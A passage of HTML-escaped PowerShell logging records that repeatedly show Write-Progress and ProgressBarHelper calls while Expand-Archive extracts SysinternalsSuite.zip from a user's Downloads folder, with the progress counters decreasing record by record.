ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;99&quot;
                                                                                                                                                                                                                                                                 
-RECORD 8-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;305&quot;
 
-RECORD 9-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;99&quot;
                                                                                                                                                                                                                                                                 
-RECORD 10----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;304&quot;
 
-RECORD 11----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;99&quot;
                                                                                                                                                                                                                                                                 
-RECORD 12----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;303&quot;
 
-RECORD 13----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;98&quot;
                                                                                                                                                                                                                                                                 
-RECORD 14----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;302&quot;
 
-RECORD 15----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;98&quot;
                                                                                                                                                                                                                                                                 
-RECORD 16----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;301&quot;
 
-RECORD 17----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;98&quot;
                                                                                                                                                                                                                                                                 
-RECORD 18----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;300&quot;
 
-RECORD 19----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;97&quot;
                                                                                                                                                                                                                                                                 
-RECORD 20----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;299&quot;
 
-RECORD 21----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;97&quot;
                                                                                                                                                                                                                                                                 
-RECORD 22----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;298&quot;
 
-RECORD 23----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;97&quot;
                                                                                                                                                                                                                                                                 
-RECORD 24----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;297&quot;
 
-RECORD 25----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;96&quot;
                                                                                                                                                                                                                                                                 
-RECORD 26----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;296&quot;
 
-RECORD 27----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;96&quot;
                                                                                                                                                                                                                                                                 
-RECORD 28----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;295&quot;
 
-RECORD 29----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;96&quot;
                                                                                                                                                                                                                                                                 
-RECORD 30----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;294&quot;
 
-RECORD 31----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;95&quot;
                                                                                                                                                                                                                                                                 
-RECORD 32----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;293&quot;
 
-RECORD 33----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;95&quot;
                                                                                                                                                                                                                                                                 
-RECORD 34----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;292&quot;
 
-RECORD 35----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;95&quot;
                                                                                                                                                                                                                                                                 
-RECORD 36----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;291&quot;
 
-RECORD 37----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;94&quot;
                                                                                                                                                                                                                                                                 
-RECORD 38----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;290&quot;
 
-RECORD 39----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;94&quot;
                                                                                                                                                                                                                                                                 
-RECORD 40----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;289&quot;
 
-RECORD 41----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;94&quot;
                                                                                                                                                                                                                                                                 
-RECORD 42----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;288&quot;
 
-RECORD 43----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
